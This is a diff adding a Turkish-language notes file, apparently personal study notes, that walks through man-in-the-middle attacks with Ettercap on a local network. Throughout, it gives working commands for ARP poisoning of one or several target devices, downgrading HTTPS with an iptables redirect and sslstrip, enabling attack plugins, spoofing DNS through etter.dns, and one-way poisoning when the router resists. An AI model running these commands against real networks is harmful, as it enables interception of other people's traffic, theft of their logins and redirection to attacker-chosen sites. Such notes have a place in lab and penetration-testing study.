@@ -1,0 +1,42 @@
+Ettercap Graphic mode:
+    1.)Ettercapi başlatıryoruz.
+    2.)Start Sniff diyerek dinleme işlemini başlatıyoruz.
+    3.)Host listesinden taranan cihazları görüyoruz.
+    4.)Modemimizi Target1, hedef cihazımızı Target2 olarak belirliyoruz.
+    5.)MITM menüsünden arp poison'u seçiyoruz ve mitm saldırımız başlıyor.
+    
+Ettercap Text mode:
+    1.) -> ettercap -Tq -M arp:remote -i <interface> <mac_adresle_saldırı>/<ipv4_saldırısı>/<ipv6_saldırısı>/<port> <mac_adresle_saldırı>/<ipv4_saldırısı>/<ipv6_saldırısı>/<port> (Burada / işaretlerinin arasına saldırı yapmak istediğimiz bilgileri giriyoruz.)
+    2.)"L" tuşuna tıklayarak hosts listesini açıyoruz.
+    örnek:ettercap -Tq -M arp:remote -i <interface> /192.168.1.1// /192.168.1.100//
+    
+    Birden fazla cihaza saldırmak:
+        ->ettercap -Tq -M arp:remote -i <interface> <mac_adresle_saldırı>/<ipv4_saldırısı>/<ipv6_saldırısı>/<port> <mac_adresle_saldırı>/<ipv4_saldırısı>/<ipv6_saldırısı>/<port>
+        örnek:ettercap -Tq -M arp:remote -i <interface> /192.168.1.1// /192.168.1.100-120//
+        örnek:ettercap -Tq -M arp:remote -i <interface> /192.168.1.1// /192.168.1.100, 192.168.1.101//
+        
+        
+    HTTPS Düşürmek:
+        ->iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+        ->sslstrip
+        ->ettercap -Tq -M arp:remote -S -i <interface> <mac_adresle_saldırı>/<ipv4_saldırısı>/<ipv6_saldırısı>/<port> <mac_adresle_saldırı>/<ipv4_saldırısı>/<ipv6_saldırısı>/<port>
+
+Ettercap Araçları:
+    ->ettercap -Tq -M arp:remote -S -i <interface> <mac_adresle_saldırı>/<ipv4_saldırısı>/<ipv6_saldırısı>/<port> <mac_adresle_saldırı>/<ipv4_saldırısı>/<ipv6_saldırısı>/<port>
+    "p"'ye tıklanmamız halinde pluginleri listeler. aktif etmek istediğimiz saldırının adını girip enter'a basıyoruz.
+    
+Ettercap DNS Spof:
+    -> leafpad /etc/ettercap/etter.dns dosyasını düzenleyeceğiz.
+    -> bu dosyaya yönlendirmek istediğim sitenin domainini ve karşısına yönlendirmek istediğimiz ip adresini giriyoruz.
+    ->dns spoofu aktif hale getiriyoruz.
+    
+Modem MITM saldırısına izin vermiyorsa:
+->ettercap -Tq -M arp:oneway -i <interface> <mac_adresle_saldırı>/<ipv4_saldırısı>/<ipv6_saldırısı>/<port> <mac_adresle_saldırı>/<ipv4_saldırısı>/<ipv6_saldırısı>/<port>   (Önce hedef cihazın bilgileri sonra modem bilgileri yazılmak zorunda oneway saldırıda.)
+    
+    
+        
+işlemlerimiz bittikten sonra iptables'ı devre dışı bırakıp eski haline döndürmek gerekir:
+    ->iptables -t nat --flush
+
+    
+    
